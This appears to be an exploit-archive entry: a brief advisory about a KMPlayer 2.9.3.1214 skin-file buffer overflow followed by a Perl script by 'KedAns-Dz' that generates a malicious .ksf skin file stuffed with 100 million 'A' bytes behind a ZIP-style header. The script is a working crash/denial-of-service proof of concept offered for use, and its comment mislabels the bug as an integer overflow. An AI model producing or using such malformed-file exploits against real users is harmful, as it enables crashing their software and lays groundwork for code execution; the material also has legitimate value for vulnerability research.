source: http://www.securityfocus.com/bid/46608/info

KMPlayer is prone to a remote buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied input.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

KMPlayer 2.9.3.1214 is vulnerable; other versions may also be affected.

#!/usr/bin/perl

###
# Title : KMPlayer 'Skins' V<=2.9.3.1 Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# Tested on : windows XP SP3 Fran?ais & Arabic
# Target :  KMPlayer Version <= 2.9.3.1214
###

# Note : This Exploit BOF is Special Greets to Member ' Overfolw ' From sec4ever.com

#START SYSTEM /root@MSdos/ : 
system("title KedAns-Dz");
system("color 1e");
system("cls");

print "\n\n".                  
      "          ||========================================||\n".
	  "      ||                                        ||\n".
	  "      ||   KMPlayer 'Skins' V<=2.9.3.1214       ||\n".
	  "      ||      Exploit Buffer Overflow           ||\n".
	  "      ||    Created BY KedAns-Dz                ||\n".
	  "      ||   ked-h(at)hotmail(dot)com             ||\n".
	  "      ||                                        ||\n".
	  "      ||========================================||\n\n\n";
sleep(2);
print "\n";
print " [!] Please Wait Till c0de Generate...\n";
my $ked = "\x41" x 100000000 ; # Integer Overflow
my $Buf = 
"\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00\x51\x6a\x95\x35\xaf\xa6". # Skin index
"\xbd\x3f\x45\x08\x00\x00\x3f\x00\x00\x00".
"$ked"; # end Skin index
$file = "KedSkinX.ksf"; # Evil File ( KMP.Skin.file )
open (F ,">$file");
print F $Buf;
sleep (2);
print "\n [+] Creat File : $file , Succesfully ! \n";
close (F);

#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
# GreetZ to : Islampard * Dr.Ride * Zaki.Eng * BadR0 * NoRo FouinY * Red1One
# XoreR * Mr.Dak007 * Hani * TOnyXED * Fox-Dz * Massinhou-Dz ++ all my friends ;
# > Algerians <  [D] HaCkerS-StreeT-Team [Z] > Hackers <
# My Friends on Facebook : Nayla Festa * Dz_GadlOl * MatmouR13 ...all Others
# 4nahdha.com : TitO (Dr.Ride) *  MEN_dz * Mr.LAK (Administrator) * all members ...
# sec4ever.com members Dz : =>>
#  Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz ... all Others
# hotturks.org : TeX * KadaVra ... all Others
# Kelvin.Xgr ( kelvinx.net)
#===========================================================================